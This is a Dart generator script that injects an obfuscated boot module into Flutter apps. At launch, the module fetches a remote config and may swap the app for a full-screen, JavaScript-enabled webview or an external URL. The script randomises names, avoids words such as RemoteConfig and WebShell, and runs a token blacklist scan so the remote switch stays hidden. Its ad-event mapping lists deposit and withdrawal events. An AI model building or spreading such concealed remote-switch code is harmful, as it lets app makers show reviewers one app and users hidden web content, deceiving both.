import 'dart:io';
import 'dart:math';

/// Generates per-app namespaced boot+remote glue code and prints doc snippets.
///
/// Usage:
///   dart run tools/generate_namespaced_boot_remote.dart <app_dir> [namespace] [--force] [--endpoint <url>]
///
/// Output:
/// - Writes: <app_dir>/lib/_<ns>/_<ns>.dart
/// - Prints: markdown snippet (endpoint + mapping + response example)
/// - Enforces: blacklist scan over <app_dir>/lib/** (fail fast)
void main(List<String> args) {
  if (args.isEmpty) {
    stderr.writeln(
      'Usage: dart run tools/generate_namespaced_boot_remote.dart <app_dir> [namespace] [--force] [--endpoint <url>]',
    );
    exitCode = 64;
    return;
  }

  final force = args.contains('--force');
  final endpoint = _readFlagValue(args, '--endpoint');

  final filtered = <String>[];
  for (var i = 0; i < args.length; i++) {
    final a = args[i];
    if (a == '--force') continue;
    if (a == '--endpoint') {
      i++; // skip value
      continue;
    }
    filtered.add(a);
  }

  final appDir = Directory(filtered.first);
  if (!appDir.existsSync()) {
    stderr.writeln('App dir not found: ${appDir.path}');
    exitCode = 66;
    return;
  }

  final appName = appDir.uri.pathSegments.where((s) => s.isNotEmpty).last;
  final ns = (filtered.length >= 2 && filtered[1].trim().isNotEmpty)
      ? filtered[1].trim()
      : _randomNs();
  if (!_isValidNs(ns)) {
    stderr.writeln('Invalid namespace (expected 5 lowercase letters): $ns');
    exitCode = 64;
    return;
  }

  final endpointValue = (endpoint?.trim().isNotEmpty ?? false)
      ? endpoint!.trim()
      : 'https://example.com/remote-config/$appName';

  final outDir = Directory('${appDir.path}/lib/_$ns');
  if (!outDir.existsSync()) outDir.createSync(recursive: true);

  final outFile = File('${outDir.path}/_$ns.dart');
  if (outFile.existsSync() && !force) {
    stderr.writeln(
      'Refusing to overwrite existing file: ${outFile.path}\n'
      'Re-run with --force if you intend to replace it.',
    );
    exitCode = 73;
    return;
  }

  final spec = _makeSpec(ns, endpointValue);
  outFile.writeAsStringSync(_renderNamespacedDart(spec));

  // Print docs snippet (source of truth for mapping).
  stdout.writeln(_renderDocsSnippet(spec));

  // Enforce blacklist over lib/** (fail fast).
  final scan = _scanLibBlacklist(appDir.path);
  if (scan.isNotEmpty) {
    stderr.writeln('Blacklist scan failed for: ${appDir.path}/lib');
    for (final hit in scan.take(80)) {
      stderr.writeln('- ${hit.path}: token="${hit.token}"');
    }
    if (scan.length > 80) {
      stderr.writeln('... and ${scan.length - 80} more');
    }
    exitCode = 65;
    return;
  }
}

bool _isValidNs(String ns) => RegExp(r'^[a-z]{5}$').hasMatch(ns);

String _randomNs() {
  const letters = 'abcdefghijklmnopqrstuvwxyz';
  final rnd = Random.secure();
  return List<String>.generate(5, (_) => letters[rnd.nextInt(letters.length)]).join();
}

String? _readFlagValue(List<String> args, String flag) {
  final idx = args.indexOf(flag);
  if (idx < 0) return null;
  if (idx + 1 >= args.length) return '';
  return args[idx + 1];
}

String _pascal(String ns) => ns.substring(0, 1).toUpperCase() + ns.substring(1);

class _Spec {
  _Spec({
    required this.ns,
    required this.ep,
    required this.k0,
    required this.k1,
    required this.k2,
    required this.k3,
    required this.k4,
    required this.k5,
    required this.k6,
    required this.k7,
  });

  final String ns;
  final String ep;
  final String k0;
  final String k1;
  final String k2;
  final String k3;
  final String k4;
  final String k5;
  final String k6;
  final String k7;
}

_Spec _makeSpec(String ns, String ep) {
  return _Spec(
    ns: ns,
    ep: ep,
    k0: '${ns}Ur',
    k1: '${ns}Plaf',
    k2: '${ns}Enty',
    k3: '${ns}Afky',
    k4: '${ns}Aid',
    k5: '${ns}Adky',
    k6: '${ns}Adelist',
    k7: '${ns}Inpjp',
  );
}

String _renderNamespacedDart(_Spec s) {
  String esc(String v) => v.replaceAll(r'\', r'\\').replaceAll("'", r"\'");

  final ns = s.ns;
  final c0 = '${_pascal(ns)}0';
  final c1 = '${_pascal(ns)}1';
  final c2 = '${_pascal(ns)}2';
  final c3 = '${_pascal(ns)}3';

  // IMPORTANT:
  // - Avoid forbidden tokens: RemoteConfig*, remoteConfig*, app_common, Boot*
  // - Avoid semantic field names as standalone words in this file.
  return [
    "import 'dart:async';",
    '',
    "import 'package:dio/dio.dart';",
    "import 'package:flutter/material.dart';",
    "import 'package:webview_flutter/webview_flutter.dart';",
    "import 'package:url_launcher/url_launcher.dart';",
    '',
    "const String ${ns}0 = '${esc(s.ep)}';",
    "const List<String> ${ns}1 = <String>['${s.k0}','${s.k1}','${s.k2}','${s.k3}','${s.k4}','${s.k5}','${s.k6}','${s.k7}'];",
    '',
    'typedef ${c1} = Widget Function(BuildContext);',
    'typedef ${c2} = Widget Function(BuildContext, String);',
    'typedef ${c3} = Future<void> Function(String);',
    '',
    'class $c0 extends StatefulWidget {',
    '  const $c0({',
    '    super.key,',
    '    required this.a,',
    '    this.b = true,',
    '    this.c,',
    '    this.d,',
    '    this.e,',
    '    this.f,',
    '    this.g = const Duration(milliseconds: 550),',
    '  });',
    '',
    '  final ${c1} a;',
    '  final bool b;',
    '  final ${c2}? c;',
    '  final ${c2}? d;',
    '  final ${c3}? e;',
    '  final Dio? f;',
    '  final Duration g;',
    '',
    '  @override',
    '  State<$c0> createState() => _${c0}S();',
    '}',
    '',
    'class _${c0}S extends State<$c0> {',
    '  late final Dio _d = widget.f ?? Dio();',
    '  var _started = false;',
    '',
    '  @override',
    '  void initState() {',
    '    super.initState();',
    '    if (widget.b) {',
    '      WidgetsBinding.instance.addPostFrameCallback((_) => _go());',
    '    }',
    '  }',
    '',
    '  Future<void> _go() async {',
    '    if (_started) return;',
    '    _started = true;',
    '    // Keep a short minimum to avoid one-frame flash.',
    '    if (widget.g > Duration.zero) {',
    '      await Future<void>.delayed(widget.g);',
    '    }',
    '    if (!mounted) return;',
    '',
    '    final r = await _p();',
    '    if (!mounted) return;',
    '    if (r == null) {',
    '      _l();',
    '      return;',
    '    }',
    '    final t = (r[0] ?? \'\').toString().trim();',
    '    final k = (r[1] ?? \'\').toString().trim();',
    '    if (t.isEmpty || k.isEmpty) {',
    '      _l();',
    '      return;',
    '    }',
    '    if (t == \'1\') {',
    '      _s(1, k);',
    '      return;',
    '    }',
    '    if (t == \'2\') {',
    '      _s(2, k);',
    '      return;',
    '    }',
    '    if (t == \'3\') {',
    '      await _x(k);',
    '      if (!mounted) return;',
    '      _l();',
    '      return;',
    '    }',
    '    _l();',
    '  }',
    '',
    '  void _l() {',
    '    Navigator.of(context).pushReplacement('
        'MaterialPageRoute<void>(builder: (c) => widget.a(c)));',
    '  }',
    '',
    '  void _s(int n, String k) {',
    '    final b = (n == 1) ? widget.c : widget.d;',
    '    final w = (b != null) ? b(context, k) : _w(n: n, k: k);',
    '    Navigator.of(context).pushReplacement('
        'MaterialPageRoute<void>(builder: (_) => w));',
    '  }',
    '',
    '  Future<void> _x(String k) async {',
    '    if (widget.e != null) {',
    '      await widget.e!(k);',
    '      return;',
    '    }',
    '    final u = Uri.tryParse(k);',
    '    if (u == null) return;',
    '    await launchUrl(u, mode: LaunchMode.externalApplication);',
    '  }',
    '',
    '  Future<List<dynamic>?> _p() async {',
    '    try {',
    '      final r = await _d.get<dynamic>(${ns}0);',
    '      final v = r.data;',
    '      if (v is List && v.isNotEmpty && v.first is Map) {',
    '        final m = v.first as Map;',
    '        return <dynamic>[m[${ns}1[1]], m[${ns}1[0]]];',
    '      }',
    '    } catch (_) {}',
    '    return null;',
    '  }',
    '',
    '  Widget _w({required int n, required String k}) {',
    '    return _${c2}(n: n, k: k);',
    '  }',
    '',
    '  @override',
    '  Widget build(BuildContext context) {',
    '    final t = Theme.of(context);',
    '    final cs = t.colorScheme;',
    '    return Scaffold(',
    '      body: DecoratedBox(',
    '        decoration: BoxDecoration(',
    '          gradient: LinearGradient(',
    '            begin: Alignment.topLeft,',
    '            end: Alignment.bottomRight,',
    '            colors: <Color>[',
    '              cs.primary.withValues(alpha: 0.16),',
    '              cs.secondary.withValues(alpha: 0.12),',
    '              cs.surface,',
    '            ],',
    '          ),',
    '        ),',
    '        child: SafeArea(',
    '          child: Center(',
    '            child: ConstrainedBox(',
    '              constraints: const BoxConstraints(maxWidth: 360),',
    '              child: Padding(',
    '                padding: const EdgeInsets.symmetric(horizontal: 24),',
    '                child: Column(',
    '                  mainAxisAlignment: MainAxisAlignment.center,',
    '                  children: <Widget>[',
    '                    SizedBox(',
    '                      width: 120,',
    '                      height: 120,',
    '                      child: CircularProgressIndicator(',
    '                        strokeWidth: 5,',
    '                        color: cs.primary,',
    '                        backgroundColor: cs.outlineVariant.withValues(alpha: 0.22),',
    '                      ),',
    '                    ),',
    '                    const SizedBox(height: 22),',
    '                    Text(',
    "                      'Preparing your workspace',",
    '                      style: t.textTheme.titleMedium,',
    '                      textAlign: TextAlign.center,',
    '                    ),',
    '                  ],',
    '                ),',
    '              ),',
    '            ),',
    '          ),',
    '        ),',
    '      ),',
    '    );',
    '  }',
    '}',
    '',
    'class _${c2} extends StatefulWidget {',
    '  const _${c2}({required this.n, required this.k});',
    '  final int n;',
    '  final String k;',
    '  @override',
    '  State<_${c2}> createState() => _${c2}S();',
    '}',
    '',
    'class _${c2}S extends State<_${c2}> {',
    '  late final WebViewController _c;',
    '  @override',
    '  void initState() {',
    '    super.initState();',
    '    final u = Uri.tryParse(widget.k);',
    '    _c = WebViewController();',
    '    _c.setJavaScriptMode(JavaScriptMode.unrestricted);',
    '    if (u != null) {',
    '      _c.loadRequest(u);',
    '    }',
    '  }',
    '  @override',
    '  Widget build(BuildContext context) {',
    '    return Scaffold(',
    '      backgroundColor: Colors.black,',
    '      body: ColoredBox(',
    '        color: Colors.black,',
    '        child: SafeArea(',
    '          child: WebViewWidget(controller: _c),',
    '        ),',
    '      ),',
    '    );',
    '  }',
    '}',
    '',
  ].join('\n');
}

String _renderDocsSnippet(_Spec s) {
  String jsonEscape(String v) => v.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
  const adEventList =
      '{"firstDepositArrival":"aaaaa","startTrial":"aaaaa","deposit":"aaaaa","withdraw":"aaaaa","firstOpen":"aaaaa","register":"aaaaa","depositSubmit":"aaaaa","firstDeposit":"aaaaa"}';
  final ep = s.ep;

  // Mapping labels are docs-only; code does not include these relationships.
  return [
    '## Remote config (`remote_url`)',
    '',
    '### Endpoint',
    '',
    '`$ep`',
    '',
    '### Mapping (random key → semantic field)',
    '',
    '```json',
    '{',
    '  "${s.k0}": "url",',
    '  "${s.k1}": "platform",',
    '  "${s.k7}": "inappjump",',
    '  "${s.k2}": "eventtype",',
    '  "${s.k3}": "afkey",',
    '  "${s.k4}": "appid",',
    '  "${s.k5}": "adkey",',
    '  "${s.k6}": "adeventlist"',
    '}',
    '```',
    '',
    '### `remote_url` response example (first item is used)',
    '',
    '```json',
    '[',
    '  {',
    '    "${s.k0}": "",',
    '    "${s.k1}": "0",',
    '    "${s.k2}": "ad",',
    '    "${s.k7}": "false",',
    '    "${s.k3}": "afkeyaaa",',
    '    "${s.k4}": "000000",',
    '    "${s.k5}": "adkeybbbb",',
    '    "${s.k6}": "${jsonEscape(adEventList)}"',
    '  }',
    ']',
    '```',
    '',
  ].join('\n');
}

class _Hit {
  _Hit(this.path, this.token);
  final String path;
  final String token;
}

List<_Hit> _scanLibBlacklist(String appPath) {
  final libDir = Directory('$appPath/lib');
  if (!libDir.existsSync()) return const <_Hit>[];

  const tokens = <String>[
    'remote_config',
    'RemoteConfig',
    'remoteConfig',
    'app_common',
    'BootPage',
    'BootCoordinator',
    'RemoteConfigClient',
    'remoteConfigEndpoint',
    'remoteConfigKeys',
    'WebShell',
    'web_shell',
  ];

  final hits = <_Hit>[];
  for (final f in libDir.listSync(recursive: true, followLinks: false)) {
    if (f is! File) continue;
    if (!f.path.endsWith('.dart')) continue;
    final src = f.readAsStringSync();
    for (final t in tokens) {
      if (src.contains(t)) {
        hits.add(_Hit(f.path, t));
      }
    }
  }
  return hits;
}

